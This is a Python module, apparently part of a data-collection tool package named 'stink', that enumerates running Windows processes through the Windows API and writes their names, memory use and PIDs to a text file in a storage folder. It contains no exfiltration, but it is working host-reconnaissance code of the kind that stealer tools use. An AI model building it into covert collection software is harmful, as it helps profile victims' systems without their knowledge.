from time import sleep
from os import makedirs, path
from ctypes import windll, sizeof, byref

from stink.helpers import functions
from stink.helpers import ProcessEntry32, ProcessMemoryCountersEx


class Processes:
    """
    Collects all running processes.
    """
    def __init__(self, storage_path: str, folder: str):

        self.__full_path = path.join(storage_path, folder)

    def __create_folder(self) -> None:
        """
        Creates storage for the Processes module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not path.exists(self.__full_path):
            makedirs(self.__full_path, exist_ok=True)

    def __get_system_processes(self) -> None:
        """
        Collects all running processes.

        Parameters:
        - None.

        Returns:
        - None.
        """
        results = []

        PROCESS_QUERY_INFORMATION = 0x0400
        PROCESS_VM_READ = 0x0010
        TH32CS_SNAPPROCESS = 0x00000002

        kernel32 = windll.kernel32
        psapi = windll.psapi

        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        process_entry = ProcessEntry32()
        process_entry.dwSize = sizeof(ProcessEntry32)

        if kernel32.Process32First(snapshot, byref(process_entry)):
            while kernel32.Process32Next(snapshot, byref(process_entry)):

                process_handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, process_entry.th32ProcessID)
                process_name = process_entry.szExeFile.decode()
                process_memory_counters = ProcessMemoryCountersEx()
                process_memory_counters.cb = sizeof(ProcessMemoryCountersEx)
                psapi.GetProcessMemoryInfo(process_handle, byref(process_memory_counters), sizeof(ProcessMemoryCountersEx))
                process_memory = process_memory_counters.WorkingSetSize // (1024 * 1024)

                results.append([process_name, f"{process_memory} MB", process_entry.th32ProcessID])
                kernel32.CloseHandle(process_handle)
                sleep(0.00001)

        with open(path.join(self.__full_path, "Processes.txt"), "a", newline="", encoding="utf-8") as processes:
            processes.write("\n".join(line for line in functions.create_table(["Name", "Memory", "PID"], results)))

        processes.close()

    def run(self) -> None:
        """
        Launches the processes collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__create_folder()
            self.__get_system_processes()

        except Exception as e:
            print(f"[Processes]: {repr(e)}")
